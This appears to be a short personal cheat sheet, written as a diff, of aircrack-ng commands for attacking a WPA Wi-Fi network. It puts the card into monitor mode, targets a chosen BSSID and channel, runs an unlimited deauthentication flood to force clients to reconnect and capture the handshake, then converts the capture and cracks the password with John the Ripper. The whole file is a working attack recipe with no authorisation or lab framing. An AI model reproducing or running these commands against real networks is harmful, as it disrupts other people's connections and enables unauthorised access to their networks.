@@ -1,0 +1,13 @@
+// dumping and deauthing 
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+// copy or noted the bssid and the channel
+sudo airodump-ng wlan0mon -b <bssidName>
+sudo airodump-ng -w fileName -c channelName -b bssidId wlan0mon
+//open different terminal 
+sudo aireplay-ng --deauth 0 -a bssid wlan0mon
+// handshake capture 
+sudo aircrack-ng -j fileName "path/fileName.hccap" 
+hccap2John "fileName.hccap" > fileName.txt
+john fileName.txt
